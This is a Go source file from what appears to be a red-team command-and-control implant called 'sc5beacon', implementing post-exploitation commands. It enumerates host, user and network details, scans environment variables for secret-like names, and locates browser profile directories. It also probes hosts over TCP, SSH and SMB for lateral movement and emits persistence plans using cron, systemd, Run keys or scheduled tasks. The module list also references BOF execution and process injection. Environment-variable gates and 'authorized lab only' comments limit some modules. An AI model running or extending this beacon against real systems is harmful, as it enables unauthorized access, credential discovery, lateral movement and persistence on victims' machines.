package main

import (
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// Post-exploitation task surface (I7–I10). Dangerous actions stay gated.
// Authorized red team / lab use only.

func handlePostEx(cmd string, args map[string]any) (string, bool) {
	cmd = strings.TrimSpace(cmd)
	switch {
	case cmd == "sa:whoami" || cmd == "whoami":
		return saWhoami(), true
	case cmd == "sa:sysinfo" || cmd == "sysinfo":
		return saSysinfoDetailed(), true
	case cmd == "sa:env":
		return saEnv(args), true
	case cmd == "sa:net" || cmd == "net:ifaces":
		return saNetIfaces(), true
	case cmd == "sa:routes":
		return saRoutes(), true
	case cmd == "sa:users":
		return saUsers(), true
	case cmd == "sa:procs" || cmd == "ps":
		return listProcesses(), true
	case cmd == "sa:cwd":
		return jobs.getCwd(), true
	case strings.HasPrefix(cmd, "cred:"):
		return handleCred(cmd, args), true
	case strings.HasPrefix(cmd, "lat:") || strings.HasPrefix(cmd, "lateral:"):
		return handleLateral(cmd, args), true
	case strings.HasPrefix(cmd, "persist:"):
		return handlePersist(cmd, args), true
	case cmd == "module:list":
		return moduleListJSON(), true
	default:
		return "", false
	}
}

func saWhoami() string {
	u := envUser()
	home := os.Getenv("HOME")
	if home == "" {
		home = os.Getenv("USERPROFILE")
	}
	uid := ""
	if cu, err := user.Current(); err == nil {
		uid = cu.Uid
		if u == "" {
			u = cu.Username
		}
		if home == "" {
			home = cu.HomeDir
		}
	}
	out := map[string]any{
		"user":     u,
		"uid":      uid,
		"home":     home,
		"hostname": hostName(),
		"os":       runtime.GOOS,
		"arch":     runtime.GOARCH,
		"pid":      os.Getpid(),
		"ppid":     os.Getppid(),
		"cwd":      jobs.getCwd(),
		"elevated": isElevated(),
	}
	b, _ := json.Marshal(out)
	return string(b)
}

func saSysinfoDetailed() string {
	out := map[string]any{
		"os":         runtime.GOOS,
		"arch":       runtime.GOARCH,
		"hostname":   hostName(),
		"user":       envUser(),
		"cwd":        jobs.getCwd(),
		"num_cpu":    runtime.NumCPU(),
		"goroutines": runtime.NumGoroutine(),
		"pid":        os.Getpid(),
		"agent":      "sc5beacon",
		"version":    "3.1.0",
		"time_utc":   time.Now().UTC().Format(time.RFC3339),
	}
	if hi, err := os.Hostname(); err == nil {
		out["hostname"] = hi
	}
	b, _ := json.Marshal(out)
	return string(b)
}

func saEnv(args map[string]any) string {
	keys := []string{"PATH", "HOME", "USER", "USERNAME", "USERPROFILE", "TEMP", "TMP",
		"SHELL", "ComSpec", "NUMBER_OF_PROCESSORS", "OS", "COMPUTERNAME", "LOGNAME"}
	if extra, ok := args["keys"].(string); ok && extra != "" {
		keys = append(keys, strings.Split(extra, ",")...)
	}
	m := map[string]string{}
	for _, k := range keys {
		k = strings.TrimSpace(k)
		if k == "" {
			continue
		}
		if v := os.Getenv(k); v != "" {
			m[k] = v
		}
	}
	b, _ := json.Marshal(m)
	return string(b)
}

func saNetIfaces() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "error: " + err.Error()
	}
	type addrInfo struct {
		IP string `json:"ip"`
	}
	type ifaceInfo struct {
		Name  string     `json:"name"`
		MAC   string     `json:"mac"`
		Flags string     `json:"flags"`
		Addrs []addrInfo `json:"addrs"`
	}
	var out []ifaceInfo
	for _, iface := range ifaces {
		ii := ifaceInfo{Name: iface.Name, MAC: iface.HardwareAddr.String(), Flags: iface.Flags.String()}
		addrs, _ := iface.Addrs()
		for _, a := range addrs {
			ii.Addrs = append(ii.Addrs, addrInfo{IP: a.String()})
		}
		out = append(out, ii)
	}
	b, _ := json.Marshal(out)
	return string(b)
}

func saRoutes() string {
	// Portable summary: list interface gateways via default route discovery is OS-specific.
	// Provide interface list + note for operator tooling.
	return saNetIfaces() + "\n# routes: use platform netstat/ip route via shell when needed"
}

func saUsers() string {
	// Best-effort: list home parent entries (lab SA). Full OS user DB is platform-specific.
	homes := []string{}
	candidates := []string{"/home", "/Users"}
	if runtime.GOOS == "windows" {
		candidates = []string{filepath.Join(os.Getenv("SystemDrive")+"\\", "Users")}
	}
	for _, base := range candidates {
		entries, err := os.ReadDir(base)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() {
				homes = append(homes, filepath.Join(base, e.Name()))
			}
		}
	}
	b, _ := json.Marshal(map[string]any{"home_dirs": homes, "note": "directory enumeration only"})
	return string(b)
}

func isElevated() bool {
	if runtime.GOOS == "windows" {
		// Best-effort: admin group check is complex; report false unless root-like env
		return os.Getenv("SESSIONNAME") == "" && false
	}
	return os.Geteuid() == 0
}

func handleCred(cmd string, args map[string]any) string {
	if !allowPostExSensitive() {
		return "error: credential modules disabled (set SC5_ALLOW_POSTEX=1 for authorized lab only)"
	}
	op := strings.TrimPrefix(cmd, "cred:")
	switch op {
	case "list":
		return credList()
	case "env_secrets":
		return credEnvSecrets()
	case "browser_paths":
		return credBrowserPaths()
	default:
		return "error: unknown cred op " + op + " (list|env_secrets|browser_paths)"
	}
}

func credList() string {
	mods := []map[string]string{
		{"id": "env_secrets", "risk": "medium", "desc": "Scan env for key-like variables (names only + redacted)"},
		{"id": "browser_paths", "risk": "low", "desc": "Locate browser profile dirs (no secret extraction by default)"},
	}
	b, _ := json.Marshal(mods)
	return string(b)
}

func credEnvSecrets() string {
	// Names only / redacted values — never dump full secrets by default
	interesting := []string{"KEY", "TOKEN", "SECRET", "PASSWORD", "PASS", "CRED", "API", "AWS", "AZURE", "GCP"}
	found := []map[string]string{}
	for _, e := range os.Environ() {
		parts := strings.SplitN(e, "=", 2)
		if len(parts) < 1 {
			continue
		}
		name := parts[0]
		up := strings.ToUpper(name)
		hit := false
		for _, k := range interesting {
			if strings.Contains(up, k) {
				hit = true
				break
			}
		}
		if !hit {
			continue
		}
		val := ""
		if len(parts) == 2 {
			v := parts[1]
			if len(v) <= 4 {
				val = "****"
			} else {
				val = v[:2] + strings.Repeat("*", min(12, len(v)-2))
			}
		}
		found = append(found, map[string]string{"name": name, "value_redacted": val})
	}
	b, _ := json.Marshal(map[string]any{"matches": found, "note": "redacted; authorized lab only"})
	return string(b)
}

func credBrowserPaths() string {
	home := os.Getenv("HOME")
	if home == "" {
		home = os.Getenv("USERPROFILE")
	}
	paths := []string{}
	cands := []string{
		filepath.Join(home, ".mozilla", "firefox"),
		filepath.Join(home, ".config", "google-chrome"),
		filepath.Join(home, ".config", "chromium"),
		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data"),
		filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles"),
		filepath.Join(home, "Library", "Application Support", "Google", "Chrome"),
		filepath.Join(home, "Library", "Application Support", "Firefox", "Profiles"),
	}
	for _, p := range cands {
		if st, err := os.Stat(p); err == nil && st.IsDir() {
			paths = append(paths, p)
		}
	}
	b, _ := json.Marshal(map[string]any{"paths": paths, "note": "paths only — no DPAPI/keychain dump in default build"})
	return string(b)
}

func handleLateral(cmd string, args map[string]any) string {
	if !allowPostExSensitive() {
		return "error: lateral modules disabled (set SC5_ALLOW_POSTEX=1 for authorized lab only)"
	}
	op := strings.TrimPrefix(strings.TrimPrefix(cmd, "lateral:"), "lat:")
	switch op {
	case "list":
		return latList()
	case "ssh_probe":
		return latSSHProbe(args)
	case "tcp_probe":
		return latTCPProbe(args)
	case "smb_probe":
		return latSMBProbe(args)
	default:
		return "error: unknown lateral op " + op + " (list|ssh_probe|tcp_probe|smb_probe)"
	}
}

func latList() string {
	mods := []map[string]string{
		{"id": "tcp_probe", "risk": "low", "desc": "TCP connect probe to host:port"},
		{"id": "ssh_probe", "risk": "medium", "desc": "SSH banner grab (no auth)"},
		{"id": "smb_probe", "risk": "medium", "desc": "TCP/445 reachability check"},
	}
	b, _ := json.Marshal(mods)
	return string(b)
}

func latTCPProbe(args map[string]any) string {
	host, _ := args["host"].(string)
	port := anyToInt(args["port"])
	if host == "" || port <= 0 {
		return "error: host and port required"
	}
	addr := net.JoinHostPort(host, fmt.Sprintf("%d", port))
	start := time.Now()
	c, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		b, _ := json.Marshal(map[string]any{"ok": false, "addr": addr, "error": err.Error()})
		return string(b)
	}
	_ = c.Close()
	b, _ := json.Marshal(map[string]any{"ok": true, "addr": addr, "rtt_ms": time.Since(start).Milliseconds()})
	return string(b)
}

func latSSHProbe(args map[string]any) string {
	host, _ := args["host"].(string)
	port := anyToInt(args["port"])
	if port <= 0 {
		port = 22
	}
	if host == "" {
		return "error: host required"
	}
	addr := net.JoinHostPort(host, fmt.Sprintf("%d", port))
	c, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return fmt.Sprintf(`{"ok":false,"error":%q}`, err.Error())
	}
	defer c.Close()
	_ = c.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 256)
	n, _ := c.Read(buf)
	banner := strings.TrimSpace(string(buf[:n]))
	b, _ := json.Marshal(map[string]any{"ok": true, "addr": addr, "banner": banner})
	return string(b)
}

func latSMBProbe(args map[string]any) string {
	if args == nil {
		args = map[string]any{}
	}
	if _, ok := args["port"]; !ok {
		args["port"] = float64(445)
	}
	return latTCPProbe(args)
}

func handlePersist(cmd string, args map[string]any) string {
	if !allowPostExSensitive() {
		return "error: persistence modules disabled (set SC5_ALLOW_POSTEX=1 for authorized lab only)"
	}
	op := strings.TrimPrefix(cmd, "persist:")
	switch op {
	case "list":
		return persistList()
	case "cron_hint", "plan":
		return persistPlan(args)
	default:
		return "error: unknown persist op " + op + " (list|plan) — no silent install in default build"
	}
}

func persistList() string {
	mods := []map[string]string{
		{"id": "plan", "risk": "high", "desc": "Emit operator-reviewed persistence plan (no apply)"},
	}
	b, _ := json.Marshal(mods)
	return string(b)
}

func persistPlan(args map[string]any) string {
	method, _ := args["method"].(string)
	if method == "" {
		method = "user_cron"
	}
	bin, _ := os.Executable()
	plan := map[string]any{
		"method": method,
		"os":     runtime.GOOS,
		"binary": bin,
		"note":   "PLAN ONLY — default build does not install persistence",
		"steps": []string{
			"Review engagement ROE and HITL policy",
			"Confirm binary path and C2 callback host",
			"Operator applies persistence manually or via future gated apply",
		},
	}
	if runtime.GOOS == "windows" {
		plan["suggested"] = []string{
			"HKCU Run key (user)",
			"Scheduled Task (user)",
		}
	} else {
		plan["suggested"] = []string{
			"crontab @reboot (user)",
			"systemd --user unit (user)",
		}
	}
	b, _ := json.Marshal(plan)
	return string(b)
}

func moduleListJSON() string {
	mods := []map[string]any{
		{"cmd": "sa:whoami", "risk": "low", "gate": "none"},
		{"cmd": "sa:sysinfo", "risk": "low", "gate": "none"},
		{"cmd": "sa:env", "risk": "low", "gate": "none"},
		{"cmd": "sa:net", "risk": "low", "gate": "none"},
		{"cmd": "sa:users", "risk": "low", "gate": "none"},
		{"cmd": "cred:list", "risk": "medium", "gate": "SC5_ALLOW_POSTEX=1"},
		{"cmd": "cred:env_secrets", "risk": "medium", "gate": "SC5_ALLOW_POSTEX=1"},
		{"cmd": "cred:browser_paths", "risk": "low", "gate": "SC5_ALLOW_POSTEX=1"},
		{"cmd": "lat:tcp_probe", "risk": "low", "gate": "SC5_ALLOW_POSTEX=1"},
		{"cmd": "lat:ssh_probe", "risk": "medium", "gate": "SC5_ALLOW_POSTEX=1"},
		{"cmd": "lat:smb_probe", "risk": "medium", "gate": "SC5_ALLOW_POSTEX=1"},
		{"cmd": "persist:plan", "risk": "high", "gate": "SC5_ALLOW_POSTEX=1"},
		{"cmd": "bof:run", "risk": "high", "gate": "SC5_ALLOW_BOF=1"},
		{"cmd": "inject:*", "risk": "high", "gate": "SC5_ALLOW_INJECT=1"},
	}
	b, _ := json.Marshal(mods)
	return string(b)
}

func allowPostExSensitive() bool {
	return cfgAllowPostEx || getenv("SC5_ALLOW_POSTEX") == "1"
}

var cfgAllowPostEx bool

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
